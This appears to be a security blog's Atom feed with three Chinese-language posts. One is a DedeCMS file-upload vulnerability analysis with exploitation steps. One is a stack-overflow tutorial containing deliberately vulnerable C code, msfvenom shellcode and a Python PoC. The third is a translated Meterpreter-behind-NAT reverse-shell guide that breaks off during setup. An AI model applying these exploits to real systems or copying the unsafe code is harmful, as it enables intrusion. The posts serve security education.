<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>tusk1&#39;Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-02-17T05:33:10.629Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>tusk1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>dedecms v5.7 sp2 文件上传漏洞[CVE-2019-8362]</title>
    <link href="http://yoursite.com/2019/02/16/dedecms%20v5.7%20sp2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/02/16/dedecms v5.7 sp2文件上传漏洞/</id>
    <published>2019-02-16T15:15:50.000Z</published>
    <updated>2019-02-17T05:33:10.629Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>织梦内容管理系统(DedeCms) ，是国内最知名的PHP开源网站管理系统，也是使用用户最多的PHP类CMS系统，在经历多年的发展，DedeCms的主要目标用户锁定在个人站长，功能更专注于个人网站或中小型门户的构建，当然也不乏有企业用户和学校等在使用该系统。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>漏洞位于dede/album_edit.php或dede/album_add.php中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">    /*---------------------</span><br><span class="line">    function _getformzip()</span><br><span class="line">    从ZIP文件中获取新图片</span><br><span class="line">    ---------------------*/</span><br><span class="line">if($formzip==1)</span><br><span class="line">    &#123;</span><br><span class="line">        include_once(DEDEINC.&quot;/zip.class.php&quot;);</span><br><span class="line">        include_once(DEDEADMIN.&quot;/file_class.php&quot;);</span><br><span class="line">        $zipfile = $cfg_basedir.str_replace($cfg_mainsite,&apos;&apos;,$zipfile);</span><br><span class="line">        $tmpzipdir = DEDEDATA.&apos;/ziptmp/&apos;.cn_substr(md5(ExecTime()),16);</span><br><span class="line">        $ntime = time();</span><br><span class="line">        if(file_exists($zipfile))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            @mkdir($tmpzipdir,$GLOBALS[&apos;cfg_dir_purview&apos;]);</span><br><span class="line">            @chmod($tmpzipdir,$GLOBALS[&apos;cfg_dir_purview&apos;]);</span><br><span class="line">            $z = new zip();</span><br><span class="line">            $z-&gt;ExtractAll($zipfile,$tmpzipdir);</span><br><span class="line">            $fm = new FileManagement();</span><br><span class="line">            $imgs = array();</span><br><span class="line">            $fm-&gt;GetMatchFiles($tmpzipdir,&quot;jpg|png|gif&quot;,$imgs);</span><br><span class="line">            $i = 0;</span><br><span class="line">            foreach($imgs as $imgold)</span><br><span class="line">            &#123;</span><br><span class="line">                $i++;</span><br><span class="line">                $savepath = $cfg_image_dir.&quot;/&quot;.MyDate(&quot;Y-m&quot;,$ntime);</span><br><span class="line">                CreateDir($savepath);</span><br><span class="line">                $iurl = $savepath.&quot;/&quot;.MyDate(&quot;d&quot;,$ntime).dd2char(MyDate(&quot;His&quot;,$ntime).&apos;-&apos;.$adminid.&quot;-&#123;$i&#125;&quot;.mt_rand(1000,9999));</span><br><span class="line">                $iurl = $iurl.substr($imgold,-4,4);</span><br><span class="line">                $imgfile = $cfg_basedir.$iurl;</span><br><span class="line">                copy($imgold,$imgfile);</span><br><span class="line">                unlink($imgold);</span><br><span class="line">                if(is_file($imgfile))</span><br><span class="line">                &#123;</span><br><span class="line">                    $litpicname = $pagestyle &gt; 2 ? GetImageMapDD($iurl,$cfg_ddimg_width) : $iurl;</span><br><span class="line">                    $info = &apos;&apos;;</span><br><span class="line">                    $imginfos = GetImageSize($imgfile,$info);</span><br><span class="line">                    $imgurls .= &quot;&#123;dede:img ddimg=&apos;$litpicname&apos; text=&apos;&apos; width=&apos;&quot;.$imginfos[0].&quot;&apos; height=&apos;&quot;.$imginfos[1].&quot;&apos;&#125; $iurl &#123;/dede:img&#125;\r\n&quot;;</span><br><span class="line"></span><br><span class="line">                    //把图片信息保存到媒体文档管理档案中</span><br><span class="line">                    $inquery = &quot;</span><br><span class="line">                   INSERT INTO #@__uploads(title,url,mediatype,width,height,playtime,filesize,uptime,mid)</span><br><span class="line">                    VALUES (&apos;&#123;$title&#125;&apos;,&apos;&#123;$iurl&#125;&apos;,&apos;1&apos;,&apos;&quot;.$imginfos[0].&quot;&apos;,&apos;&quot;.$imginfos[1].&quot;&apos;,&apos;0&apos;,&apos;&quot;.filesize($imgfile).&quot;&apos;,&apos;&quot;.$ntime.&quot;&apos;,&apos;$adminid&apos;);</span><br><span class="line">                 &quot;;</span><br><span class="line">                    $dsql-&gt;ExecuteNoneQuery($inquery);</span><br><span class="line">                    if(!$hasone &amp;&amp; $ddisfirst==1</span><br><span class="line">                    &amp;&amp; $litpic==&quot;&quot; &amp;&amp; !empty($litpicname))</span><br><span class="line">                    &#123;</span><br><span class="line">                        if( file_exists($cfg_basedir.$litpicname) )</span><br><span class="line">                        &#123;</span><br><span class="line">                            $litpic = $litpicname;</span><br><span class="line">                            $hasone = true;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if($delzip==1)</span><br><span class="line">            &#123;</span><br><span class="line">                unlink($zipfile);</span><br><span class="line">            &#125;</span><br><span class="line">            $fm-&gt;RmDirFiles($tmpzipdir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>此段代码的功能是从zip文件中获取图片，GetMatchFiles函数获取符合规则的图片(由传入参数知道是png,jpg,gif)，<br>跟进GetMatchFiles函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function GetMatchFiles($indir, $fileexp, &amp;$filearr)</span><br><span class="line">&#123;</span><br><span class="line">    $dh = dir($indir);</span><br><span class="line">    while($filename = $dh-&gt;read())</span><br><span class="line">    &#123;</span><br><span class="line">        $truefile = $indir.&apos;/&apos;.$filename;</span><br><span class="line">        if($filename == &quot;.&quot; || $filename == &quot;..&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(is_dir($truefile))</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;GetMatchFiles($truefile, $fileexp, $filearr);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(preg_match(&quot;/\.(&quot;.$fileexp.&quot;)/i&quot;,$filename))</span><br><span class="line">        &#123;</span><br><span class="line">            $filearr[] = $truefile;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $dh-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题就出在：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">else if(preg_match(&quot;/\.(&quot;.$fileexp.&quot;)/i&quot;,$filename))</span><br><span class="line">&#123;</span><br><span class="line">    $filearr[] = $truefile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>只要文件名中包含”.jpg”、”.png”、”.gif”即可被上传。因此可以在zip文件中创建包含这几个字符串的php文件然后上传。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>创建一个zip文件，其中包含一个php文件名称为”1.jpg.php”<br><img src="/2019/02/16/dedecms v5.7 sp2文件上传漏洞/1.png" alt=""><br>然后访问dede/album_edit.php，选择”从ZIP压缩包中解压文件”，然后上传准备好的zip文件。<br><img src="/2019/02/16/dedecms v5.7 sp2文件上传漏洞/2.png" alt=""><br>然后查看图集即可访问上传的php文件<br><img src="/2019/02/16/dedecms v5.7 sp2文件上传漏洞/3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;织梦内容管理系统(DedeCms) ，是国内最知名的PHP开源网站管理系统，也是使用用户最多的PHP类CMS系统，在经历多年的发展，Dede
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>metasploit在栈溢出中的运用</title>
    <link href="http://yoursite.com/2019/02/13/metasploit%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/"/>
    <id>http://yoursite.com/2019/02/13/metasploit在栈溢出中的运用/</id>
    <published>2019-02-13T12:21:03.000Z</published>
    <updated>2019-02-13T12:36:14.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>将下列存在栈溢出漏洞的代码在DEV-C++中编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void foo(char bar[])&#123;</span><br><span class="line">char c[12];</span><br><span class="line">memcpy(c, bar, 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line">char a[1000];</span><br><span class="line">printf(&quot;input:&quot;); </span><br><span class="line">fp = fopen(&quot;1.txt&quot;,&quot;rb&quot;);</span><br><span class="line">fread(a, 1, 1000,fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">foo(a);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="控制EIP覆盖"><a href="#控制EIP覆盖" class="headerlink" title="控制EIP覆盖"></a>控制EIP覆盖</h2><p>使用metasploit中的pattern_create.rb生成字符串:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100</span><br><span class="line">[*] exec: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span><br></pre></td></tr></table></figure></p><p>将生成的字符串保存到1.txt中，然后OD中调试程序，可以看到当程序发生异常时EIP为41386141<br><img src="/2019/02/13/metasploit在栈溢出中的运用/1.png" alt=""><br><img src="/2019/02/13/metasploit在栈溢出中的运用/2.png" alt=""><br>然后在pattern_offset中确定EIP的位置;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41386141 -l 100</span><br><span class="line">[*] exec: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41386141 -l 100</span><br><span class="line"></span><br><span class="line">[*] Exact match at offset 24</span><br></pre></td></tr></table></figure></p><p>可以确定EIP在第24个字符处</p><h2 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h2><p>在OD调试时可以知道EIP是在0062FAAC处，因此我们可以将shellcode放在其后继续覆盖，然后将EIP覆盖为0062FAB0，当程序在foo函数中执行retn时就会被劫持到shellcode处执行。</p><p>然后可以使用metasploit生成shellcode:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[*] exec: msfvenom - -p windows/exec cmd=calc.exe -f python</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 193 bytes</span><br><span class="line">Final size of python file: 932 bytes</span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&quot;</span><br><span class="line">buf += &quot;\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7&quot;</span><br><span class="line">buf += &quot;\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf&quot;</span><br><span class="line">buf += &quot;\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c&quot;</span><br><span class="line">buf += &quot;\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01&quot;</span><br><span class="line">buf += &quot;\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31&quot;</span><br><span class="line">buf += &quot;\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d&quot;</span><br><span class="line">buf += &quot;\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66&quot;</span><br><span class="line">buf += &quot;\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0&quot;</span><br><span class="line">buf += &quot;\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f&quot;</span><br><span class="line">buf += &quot;\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00&quot;</span><br><span class="line">buf += &quot;\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5&quot;</span><br><span class="line">buf += &quot;\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a&quot;</span><br><span class="line">buf += &quot;\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span><br><span class="line">buf += &quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span><br></pre></td></tr></table></figure></p><p>然后用python编写poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shell = &quot;&quot;</span><br><span class="line">shell += &quot;\xb0\xfa\x62\x00&quot;  \\覆盖EIP</span><br><span class="line">poc = &quot;&quot;</span><br><span class="line">poc += &quot;\x41&quot; * 24 + shell</span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&quot;</span><br><span class="line">buf += &quot;\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7&quot;</span><br><span class="line">buf += &quot;\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf&quot;</span><br><span class="line">buf += &quot;\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c&quot;</span><br><span class="line">buf += &quot;\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01&quot;</span><br><span class="line">buf += &quot;\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31&quot;</span><br><span class="line">buf += &quot;\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d&quot;</span><br><span class="line">buf += &quot;\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66&quot;</span><br><span class="line">buf += &quot;\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0&quot;</span><br><span class="line">buf += &quot;\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f&quot;</span><br><span class="line">buf += &quot;\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00&quot;</span><br><span class="line">buf += &quot;\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5&quot;</span><br><span class="line">buf += &quot;\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a&quot;</span><br><span class="line">buf += &quot;\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span><br><span class="line">buf += &quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span><br><span class="line"></span><br><span class="line">poc = poc + buf</span><br><span class="line">rst = open(&quot;1.txt&quot;,&apos;w&apos;)</span><br><span class="line">rst.write(poc)</span><br><span class="line">rst.close();</span><br></pre></td></tr></table></figure></p><p>运行生成1.exe<br>最后运行示例程序,成功弹出计算器<br><img src="/2019/02/13/metasploit在栈溢出中的运用/3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;示例程序&quot;&gt;&lt;a href=&quot;#示例程序&quot; class=&quot;headerlink&quot; title=&quot;示例程序&quot;&gt;&lt;/a&gt;示例程序&lt;/h2&gt;&lt;p&gt;将下列存在栈溢出漏洞的代码在DEV-C++中编译&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;t
      
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>翻译:Metasploit Meterpreter and NAT</title>
    <link href="http://yoursite.com/2019/01/22/%E7%BF%BB%E8%AF%91-Metasploit-Meterpreter-and-NAT/"/>
    <id>http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/</id>
    <published>2019-01-22T05:39:58.000Z</published>
    <updated>2019-01-22T06:05:26.034Z</updated>
    
    <content type="html"><![CDATA[<h1 id="翻译：Metasploit-Meterpreter-and-NAT"><a href="#翻译：Metasploit-Meterpreter-and-NAT" class="headerlink" title="翻译：Metasploit Meterpreter and NAT"></a>翻译：Metasploit Meterpreter and NAT</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在对某服务器进行实战渗透的过程中，我发现metasploit不能正常发起攻击，经过查阅后发现是因为Metasploit网络服务器无法监听我们路由器的公网IP，而这篇文章(原文链接:<a href="https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/" target="_blank" rel="noopener">https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/</a> )帮助我解决了这个问题，遂翻译，以下是正文。  </p><hr><p>专业测试人员通常使用直接连接到互联网的主机，具有公网IP地址，并且不受任何防火墙或NAT设备的阻碍以执行其监听。黑客攻击“naked”(暴露公网IP的主机)被认为是进行渗透测试的最简单方法，该测试涉及反弹shell。</p><p>不是所有人都可以将主机直接连接到互联网，随着免费公网IP地址的数量不断减少，在路由器或防火墙后面使用放置在局域网中的攻击机的需求将会增加。</p><p>将攻击机放在路由设备后面会将流量从私有转换为公共并且会产生一些问题。如果启动相当快速的端口扫描，您不仅需要确保NAT设备不会“中断”，而且由于主机位于专用网络中，即路由器或防火墙后面，因此无法直接从互联网</p><p>在这种情况下，执行攻击和处理返回信息的shell可能会有问题。</p><p>在这篇小文章中，我们将了解如何正确配置Meterpreter有效负载，并使攻击机位于NAT设备后面时正常工作。我们将使用浏览器漏洞来演示如何获得有效的Meterpreter会话，甚至靶机和攻击机都在NAT后面。</p><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>我将在这篇文章中使用以下网络设置：<br><img src="/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/1.png" alt=""></p><p>攻击者和目标都在NAT设备后面。我们不知道目标使用的IP范围，我们已经确定从互联网到目标网络没有直接的路径，目标没有绑定的公网IP。<br>我们假设目标能够通过端口80和443连接到互联网。<br>在此文中，我使用IP 1.1.1.1来指攻击网络的“公共”方面。在尝试本文中的步骤时，您需要您自己的公网IP替换此IP。<br>我将使用Kali Linux作为攻击端，并在主机上设置了Metasploit Git存储库的克隆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">mkdir -p /pentest/exploits</span><br><span class="line">git clone https://github.com/rapid7/metasploit.git</span><br><span class="line">cd metasploit-framework</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p><p>如果你已经设置了git clone，请确保使用“git pull”更新到最新版本.<br>靶机的系统为Windows XP SP3，但这并不重要，我们将使用浏览器漏洞来演示如何使用Meterpreter。我从IECollection安装了Internet Explorer 8（下载地址：<a href="http://utilu.com/IECollection/)" target="_blank" rel="noopener">http://utilu.com/IECollection/)</a>. 我将使用这个IE版本，因为它已经过时，并且存在大多数IE8浏览器漏洞。  </p><h2 id="在攻击端设置转发"><a href="#在攻击端设置转发" class="headerlink" title="在攻击端设置转发"></a>在攻击端设置转发</h2><p>如果我们希望能够接受来自目标的连接，我们需要配置攻击端防火墙/ NAT以在某些端口上转发流量。<br>执行此操作的确切步骤将非常特定于你正在使用的路由器/防火墙的品牌/型号/类型，所以这超出了这篇文章的范围。<br>一般来说，我们的想法是配置路由器/防火墙，在端口80和443上与路由器的公网IP地址进行通信，<br>并被转发到192.168.0.187（我的攻击机的内网IP）。<br>配置路由器/防火墙时，请务必检查路由器/防火墙是否开放端口80和443。  </p><p>我们将使用端口80为浏览器exp提供服务，通过端口443反向连接Meterpreter。首先，我们需要验证转发是否有效。  </p><p>在Kali上，创建一个小的html文件并将其存储在/ tmp下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root @ krypto1：/ #cd / tmp </span><br><span class="line">root @ krypto1：/ tmp #echo“it works”&gt; test.html</span><br></pre></td></tr></table></figure></p><p>接下来，确保当前没有任何进程占用端口80或端口443<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# netstat -vantu | grep :80</span><br><span class="line">root@krypto1:/tmp# netstat -vantu | grep :443</span><br></pre></td></tr></table></figure></p><p>如果你没有看到两个命令的输出，可以进行下一步。如果列出了什么，你需要找到使用该端口的进程并终止进程。<br>对于端口80，你可以查看占用http端口的进程，使用lsof命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# lsof -i | grep :http </span><br><span class="line">apache2    4634     root    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4642 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4643 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4644 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4645 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4646 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure></p><p>只需停止apache2即可释放端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# service apache2 stop</span><br><span class="line">Stopping web server: apache2 ... waiting .</span><br><span class="line">root@krypto1:/tmp#</span><br></pre></td></tr></table></figure></p><p>当端口可使用后，我们运行一个简单的web服务器并提供”test.html”页面。在包含test.html文件的文件夹中，运行以下python命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br></pre></td></tr></table></figure></p><p>如果你现在在Kali中访问<a href="http://192.168.0.187/test.html，您将看到“It" target="_blank" rel="noopener">http://192.168.0.187/test.html，您将看到“It</a> works”页面和<br><img src="/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/2.png" alt=""><br>Kali浏览器的输出应列出连接并显示该页面已响应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:42:02] &quot;GET /test.html HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure></p><p>完美，这验证了网络服务器的工作原理。在靶机上，访问<a href="http://1.1.1.1/test.html" target="_blank" rel="noopener">http://1.1.1.1/test.html</a> (再一次，将1.1.1.1替换为攻击端路由器/防火墙的公网IP)并且你将得到同样的页面. 如果你没有看到该页面，请检查转发是否设置正确。<br>如果80端口成功，请返回攻击机并使用CTRL+C.终止python命令。然后再次启动命令，这次使用443端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 443 ...</span><br></pre></td></tr></table></figure></p><p>现在通过443端口访问Web服务器。尽管我们使用443端口并且443端口通常与https(加密)相关联，但我们的python处理程序不使用加密。也就是说，我们仍然必须在URL中使用http而不是https：<br><img src="/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/3.png" alt=""><br><figure class="highlight plain"><table><tr><td 